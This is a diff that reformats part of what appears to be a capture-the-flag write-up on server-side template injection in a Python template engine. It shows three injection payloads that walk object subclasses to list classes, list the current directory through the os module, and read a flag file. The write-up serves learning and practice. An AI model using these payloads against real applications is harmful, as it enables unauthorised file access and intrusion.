@@ -10,15 +10,21 @@
 
 ## 2. Injection code:
   - **List all class in python template:**  
-    `{{().__class__.__bases__[0].__subclasses__()}}`  
+    ```python
+    {{().__class__.__bases__[0].__subclasses__()}}
+    ```  
   ![Screenshot from 2021-07-25 18-15-21](https://user-images.githubusercontent.com/87865134/126897148-4edb3571-1544-4d6d-afa8-bc492fa7a88e.png)
 
   - **List file in current directory:**  
-    `{{().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}`  
+    ```python
+    {{().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
+    ```  
    ![Screenshot from 2021-07-25 18-20-06](https://user-images.githubusercontent.com/87865134/126897262-84880017-207c-4c76-acae-f940d6d1580b.png)
 
   - **Read content of file fl4g:**  
-    `{{().__class__.__bases__[0].__subclasses__()[40]('fl4g').read()}}`   
+    ```python
+    {{().__class__.__bases__[0].__subclasses__()[40]('fl4g').read()}}
+    ```   
    ![Screenshot from 2021-07-25 18-23-19](https://user-images.githubusercontent.com/87865134/126897330-df52606d-61db-4505-9307-fb81bed61ab9.png)
 
  ## - Decription:
